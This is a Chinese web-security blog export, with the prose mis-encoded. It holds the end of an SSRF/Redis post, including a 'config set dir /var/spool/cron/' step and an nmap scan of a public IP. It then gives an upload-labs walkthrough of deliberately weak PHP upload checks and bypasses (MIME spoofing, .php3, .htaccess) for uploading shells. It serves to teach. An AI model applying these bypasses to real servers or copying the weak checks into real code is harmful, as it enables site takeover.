<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> åˆ—å‡ºæ‰€æœ‰å¼€æ”¾ç«¯å£</span></span><br><span class="line">firewall-cmd --list-all</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> å°†6397ç«¯å£åŠ å…¥é˜²ç«å¢™</span></span><br><span class="line">firewall-cmd --zone=public --add-port=6397/tcp</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> é‡å¯é˜²ç«å¢™æœåŠ¡</span></span><br><span class="line">firewall-cmd --reload</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> æŸ¥çœ‹æ˜¯å¦ç”Ÿæ•ˆ</span></span><br><span class="line">firewall-cmd --zone=public --query-port=6397/tcp</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>é‡å¯redisæœåŠ¡ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart redis</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æµ‹è¯•è¿œç¨‹æ˜¯å¦èƒ½å¤Ÿè®¿é—®ï¼š</p>
<p>æŸ¥çœ‹ç«¯å£æ˜¯å¦å¼€æ”¾ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ca01h:~<span class="comment"># nmap 47.97.199.89 -p 6379</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-12 12:55 HKT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 47.97.199.89</span><br><span class="line">Host is up (0.0098s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">6379/tcp open  redis</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.31 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹æ˜¯å¦èƒ½è¿œç¨‹è¿æ¥ç›®æ ‡æœåŠ¡å™¨çš„redisæœåŠ¡ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ca01h:~<span class="comment"># redis-cli -h 47.97.199.89 -p 6379</span></span><br><span class="line">47.97.199.89:6379 &gt; info</span><br><span class="line">&gt; (è¿”å›redisåŸºæœ¬ä¿¡æ¯)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>é…ç½®å®Œæˆã€‚</p>
</li>
</ol>
<h3 id="PHP-FPM-ç¯å¢ƒæ­å»º">PHP-FPM ç¯å¢ƒæ­å»º</h3>
<p><a href="https://xz.aliyun.com/t/5598#toc-2">https://xz.aliyun.com/t/5598#toc-2</a></p>
<h3 id="Nginx-PHP-FPM-502é”™è¯¯æ’æŸ¥">Nginx+PHP-FPM 502é”™è¯¯æ’æŸ¥</h3>
<p><a href="https://www.datadoghq.com/blog/nginx-502-bad-gateway-errors-php-fpm/%E3%80%81">https://www.datadoghq.com/blog/nginx-502-bad-gateway-errors-php-fpm/ã€</a></p>
<h3 id="æ›´æ”¹Redisçš„dirå±æ€§æ˜¾ç¤ºæƒé™ä¸è¶³">æ›´æ”¹Redisçš„dirå±æ€§æ˜¾ç¤ºæƒé™ä¸è¶³</h3>
<p>è¿è¡Œå‘½ä»¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@ca0y1h-centos ~]<span class="comment"># redis-cli </span></span><br><span class="line">127.0.0.1:6379&gt; config <span class="built_in">set</span> dir /var/spool/cron/</span><br><span class="line">(error) ERR Changing directory: Permission denied</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ­¤æ—¶redisæœåŠ¡æ˜¯ä»¥érootèº«ä»½å¯åŠ¨ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@ca0y1h-centos ~]<span class="comment"># ps aux |grep redis</span></span><br><span class="line">redis     3849  0.0  0.3 142960  5804 ?        Ssl  13:24   0:00 /usr/bin/redis-server *:6379</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è§£å†³åŠæ³•ï¼š</p>
<p>å¯ä»¥ä»¥rootç”¨æˆ·ä½¿ç”¨<code>redis-server</code>å‘½ä»¤å¯åŠ¨redisæœåŠ¡ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@ca0y1h-centos ~]# redis-server &#x2F;etc&#x2F;redis.conf</span><br><span class="line">[root@ca0y1h-centos ~]# ps aux | grep redis</span><br><span class="line">root      3856  0.0  0.2  22132  5168 pts&#x2F;1    S+   13:24   0:00 redis-cli</span><br><span class="line">root      4245  0.0  0.2 142960  5312 ?        Ssl  13:28   0:00 redis-server *:6379</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Reference">Reference</h2>
<p><a href="https://joychou.org/web/phpssrf.html#directory0470238852615231466">https://joychou.org/web/phpssrf.html#directory0470238852615231466</a></p>
<p><a href="https://www.evi1.cn/post/ssrf/">https://www.evi1.cn/post/ssrf/</a></p>
<p><a href="https://paper.seebug.org/409/">https://paper.seebug.org/409/</a></p>
<p><a href="https://www.freebuf.com/articles/web/135342.html">https://www.freebuf.com/articles/web/135342.html</a></p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
        <category>åŸºç¡€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>webå®‰å…¨åŸºç¡€</tag>
        <tag>ssrf</tag>
      </tags>
  </entry>
  <entry>
    <title>Webå®‰å…¨å­¦ä¹ ä¹‹æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ©ç”¨</title>
    <url>/Web_security/basic_learning/16.%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="Webå®‰å…¨å­¦ä¹ ä¹‹æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ©ç”¨">Webå®‰å…¨å­¦ä¹ ä¹‹æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ©ç”¨</h1>
<p>åœ¨ç°ä»£äº’è”ç½‘çš„Webåº”ç”¨ç¨‹åºä¸­ï¼Œä¸Šä¼ æ–‡ä»¶æ˜¯ä¸€ç§å¸¸è§çš„åŠŸèƒ½ï¼Œå› ä¸ºå®ƒæœ‰åŠ©äºæé«˜ä¸šåŠ¡æ•ˆç‡ï¼Œç„¶è€Œå‘ç”¨æˆ·æä¾›çš„åŠŸèƒ½è¶Šå¤šï¼ŒWebåº”ç”¨å—åˆ°æ”»å‡»çš„é£é™©å°±è¶Šå¤§ï¼Œå¦‚æœWebåº”ç”¨å­˜åœ¨ä¸Šä¼ æ–‡ä»¶æ¼æ´ï¼Œé‚£ä¹ˆæ¶æ„ç”¨æˆ·å°±å¯ä»¥åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ¼æ´å°†å¯æ‰§è¡Œè„šæœ¬ç¨‹åºä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸­ï¼Œè·å¾—ç½‘ç«™æƒé™ã€‚</p>
<h2 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´ä»‹ç»">æ–‡ä»¶ä¸Šä¼ æ¼æ´ä»‹ç»</h2>
<p>åœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæ–‡ä»¶ä¸Šä¼ æ¼æ´ä¸€èˆ¬éƒ½æ˜¯æŒ‡â€œä¸Šä¼ Webè„šæœ¬èƒ½å¤Ÿè¢«æœåŠ¡å™¨è§£æâ€çš„é—®é¢˜ã€‚è¦å®Œæˆè¿™ä¸ªæ”»å‡»ï¼Œéœ€è¦æ»¡è¶³å¦‚ä¸‹å‡ ä¸ªæ¡ä»¶ï¼š</p>
<ul>
<li>ä¸Šä¼ çš„æ–‡ä»¶åæ‰€åœ¨çš„ç›®å½•è¦æ˜¯Webå®¹æ˜“èƒ½å¤Ÿè¦†ç›–åˆ°çš„è·¯å¾„ï¼Œå¯ä»¥è¢«Webå®¹å™¨è§£é‡Šæ‰§è¡Œã€‚</li>
<li>ç”¨æˆ·èƒ½å¤Ÿä»Webä¸Šè®¿é—®åˆ°è¿™ä¸ªæ–‡ä»¶ã€‚</li>
<li>ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶ä¸ä¼šè¢«å®‰å…¨æ£€æŸ¥ã€æ ¼å¼åŒ–ã€å›¾ç‰‡å‹ç¼©ç­‰åŠŸèƒ½æ”¹å˜äº†å†…å®¹ã€‚</li>
</ul>
<h2 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ©ç”¨">æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ©ç”¨</h2>
<p>æœ¬æ–‡ç»“åˆ<a href="https://github.com/c0ny1/upload-labs">upload-labs</a>æ¥å¯¹æ­¤ç§æ¼æ´åœ¨PHPä¸­çš„è¡¨ç°åšä¸€è®²è§£ã€‚</p>
<h3 id="Pass-01-å‰ç«¯JSæ£€éªŒç»•è¿‡">Pass-01 å‰ç«¯JSæ£€éªŒç»•è¿‡</h3>
<h4 id="ä»£ç ">ä»£ç </h4>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ </span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">&quot;|&quot;</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ &quot;</span> + allow_ext + <span class="string">&quot;ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š&quot;</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ˜¯ä¸€ä¸ªå‰ç«¯éªŒè¯çš„ä¸Šä¼ ç‚¹ï¼Œé’ˆå¯¹è¿™ç§æƒ…å†µæˆ‘ä»¬ä¸€èˆ¬æœ‰ä»¥ä¸‹3ç§ç»•è¿‡æ–¹æ³•ã€‚</p>
<h4 id="ç»•è¿‡æ–¹å¼">ç»•è¿‡æ–¹å¼</h4>
<h5 id="ç¦ç”¨JSä»£ç ">ç¦ç”¨JSä»£ç </h5>
<p>Chromeæµè§ˆå™¨åœ¨æ§åˆ¶å°çš„è®¾ç½®ä¸­å¯ä»¥ç›´æ¥ç¦ç”¨JSä»£ç ã€‚</p>
<h5 id="åˆ é™¤ä¸Šä¼ æŒ‰é’®çš„onsubmitå±æ€§">åˆ é™¤ä¸Šä¼ æŒ‰é’®çš„onsubmitå±æ€§</h5>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191127101318.png" alt=""></p>
<h5 id="Burpä¿®æ”¹åç¼€">Burpä¿®æ”¹åç¼€</h5>
<p>å…ˆå°†æƒ³è¦ä¸Šä¼ çš„phpè„šæœ¬çš„åç¼€ä¿®æ”¹ä¸ºjpgç»•è¿‡å‰ç«¯ï¼Œä½¿ç”¨burpæˆªæ–­åä¿®æ”¹jpgä¸ºphpç»§ç»­ä¸Šä¼ å³å¯ã€‚</p>
<h3 id="Pass-02-MIMEç±»å‹ç»•è¿‡">Pass-02 MIMEç±»å‹ç»•è¿‡</h3>
<h4 id="ä»£ç -v2">ä»£ç </h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || ($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || ($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç™½åå•çš„æ–¹å¼æ£€æŸ¥Content-Typeï¼Œä½¿ç”¨MIMEç»•è¿‡ã€‚</p>
<h4 id="ç»•è¿‡æ–¹å¼-v2">ç»•è¿‡æ–¹å¼</h4>
<h5 id="MIME">MIME</h5>
<p>åœ¨å®¢æˆ·ç«¯ä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œé€šè¿‡BurpæŠ“å–æ•°æ®åŒ…ï¼Œå½“ä¸Šä¼ ä¸€ä¸ªphpæ ¼å¼çš„æ–‡ä»¶æ—¶ï¼Œå¯ä»¥çœ‹åˆ°æ•°æ®åŒ…ä¸­çš„Content-Typeçš„å€¼æ—¶application/ostet-streamï¼Œè€Œä¸Šä¼ jpgæ ¼å¼çš„æ–‡ä»¶æ—¶ï¼Œæ•°æ®åŒ…ä¸­Content-Typeçš„å€¼æ˜¯image/jpegã€‚</p>
<p>ä¸Šä¼ phpæ ¼å¼æ–‡ä»¶ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191127110018.png" alt=""></p>
<p>ä¸Šä¼ jpgæ ¼å¼æ–‡ä»¶ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191127110145.png" alt=""></p>
<p>æ‰€ä»¥å¯¹äºè¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬åªéœ€è¦ä½¿ç”¨burpæŠ“åŒ…å¹¶ä¿®æ”¹Content-Typeå­—æ®µçš„å†…å®¹å³å¯ã€‚</p>
<h3 id="Pass-03-åˆ©ç”¨ç‰¹æ®Šåç¼€åç»•è¿‡">Pass-03 åˆ©ç”¨ç‰¹æ®Šåç¼€åç»•è¿‡</h3>
<h4 id="ä»£ç -v3">ä»£ç </h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//æ”¶å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä»…ä»…è¿‡æ»¤äº†.aspã€.aspxã€.phpã€.jspåç¼€æ–‡ä»¶ï¼Œå¯ä»¥æ›´æ”¹httpd.confä½¿å¾—å¯ä»¥è§£æ.php2ç±»ä¼¼çš„åç¼€æ–‡ä»¶ã€‚</p>
<h4 id="ç»•è¿‡æ–¹å¼-v3">ç»•è¿‡æ–¹å¼</h4>
<h5 id="httpd-confé…ç½®æ–‡ä»¶">httpd.confé…ç½®æ–‡ä»¶</h5>
<p>ä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶åï¼Œæç¤ºä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼</p>
<p>æ¨¡æ‹Ÿä¸€ä¸‹çœŸå®æ“ä½œï¼ŒF12æŸ¥çœ‹Response Headerï¼ŒæœåŠ¡å™¨ç«¯æ˜¯Apache+PHP 5.2.17ï¼Œä½¿ç”¨é»‘åå•çš„æ–¹å¼è¿‡æ»¤äº†</p>
<p>.asp,.aspx,.php,.jspæ–‡ä»¶åç¼€ã€‚ä½†æ˜¯æœ‰äº›Apacheæ˜¯å…è®¸è§£æå…¶ä»–æ–‡ä»¶åç¼€çš„ï¼Œä¾‹å¦‚åœ¨httpd.confä¸­ï¼Œå¦‚æœé…ç½®æœ‰å¦‚ä¸‹ä»£ç ï¼Œåˆ™èƒ½å¤Ÿè§£æphpã€php3å’Œphtmlã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .php .php3 .phtml</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥æˆ‘ä»¬è¿™æ—¶åªéœ€è¦å°†æ–‡ä»¶åä¿®æ”¹ä¸º.php3å°±å¯ä»¥æˆåŠŸä¸Šä¼ shellã€‚</p>
<h5 id="è§£æé¡ºåº">è§£æé¡ºåº</h5>
<p>åœ¨Apacheçš„è§£æé¡ºåºä¸­ï¼Œæ˜¯ä»å³åˆ°å·¦å¼€å§‹è§£ææ–‡ä»¶åç¼€çš„ï¼Œå¦‚æœæœ€å³ä¾§çš„æ‰©å±•åä¸å¯è¯†åˆ«ï¼Œå°±ç»§ç»­å¾€å·¦åˆ¤æ–­ï¼Œç›´åˆ°é‡åˆ°å¯ä»¥è§£æçš„æ–‡ä»¶åç¼€ä¸ºæ­¢ï¼Œæ‰€ä»¥å¦‚æœä¸Šä¼ çš„æ–‡ä»¶åç±»ä¼¼1.php.xxxxï¼Œå› ä¸ºåç¼€xxxxä¸å¯è§£æï¼Œæ‰€ä»¥å‘å·¦è§£æåç¼€phpã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191127130103.png" alt=""></p>
<h3 id="Pass-04-åˆ©ç”¨-htaccessç»•è¿‡">Pass-04 åˆ©ç”¨.htaccessç»•è¿‡</h3>
<h4 id="ä»£ç -v4">ä»£ç </h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//æ”¶å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é»‘åå•è¿‡æ»¤äº†ä¸€å¤§å †æ–‡ä»¶åï¼Œè€ƒè™‘ä¸Šä¼ .htaccessæ–‡ä»¶ä½¿å¾—Apacheå¯ä»¥å°†jpgæ–‡ä»¶è§£ææˆphpæ–‡ä»¶ã€‚</p>
<h4 id="ç»•è¿‡æ–¹å¼-v4">ç»•è¿‡æ–¹å¼</h4>
<h5 id="è§£æé¡ºåº-v2">è§£æé¡ºåº</h5>
<p>åŒPass-03</p>
<h5 id="htaccessæ–‡ä»¶">.htaccessæ–‡ä»¶</h5>
<blockquote>
<p>ä»€ä¹ˆæ˜¯.htaccessï¼Ÿ</p>
<ol>
<li>.htaccessæ˜¯ä¸€ä¸ªçº¯æ–‡æœ¬æ–‡ä»¶ï¼Œé‡Œé¢å­˜æ”¾ApacheæœåŠ¡å™¨é…ç½®ç›¸å…³æŒ‡ä»¤ï¼›</li>
<li>.htaccessä¸»è¦çš„ä½œç”¨æœ‰ï¼šURLé‡å†™ã€è‡ªå®šä¹‰é”™è¯¯é¡µé¢ã€MIMEç±»å‹é…ç½®ä»¥åŠè®¿é—®æƒé™æ§åˆ¶ç­‰ã€‚ä¸»è¦ä½“ç°åœ¨ä¼ªé™æ€çš„åº”ç”¨ã€å›¾ç‰‡é˜²ç›—é“¾ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€é˜»æ­¢/å…è®¸ç‰¹å®šIP/IPæ®µã€ç›®å½•æµè§ˆä¸ä¸»é¡µã€ç¦æ­¢è®¿é—®æŒ‡å®šæ–‡ä»¶ç±»å‹ã€æ–‡ä»¶å¯†ç ä¿æŠ¤ç­‰ï¼›</li>
<li>.htaccessçš„ç”¨é€”èŒƒå›´ä¸»è¦é’ˆå¯¹å½“å‰ç›®å½•ã€‚</li>
</ol>
</blockquote>
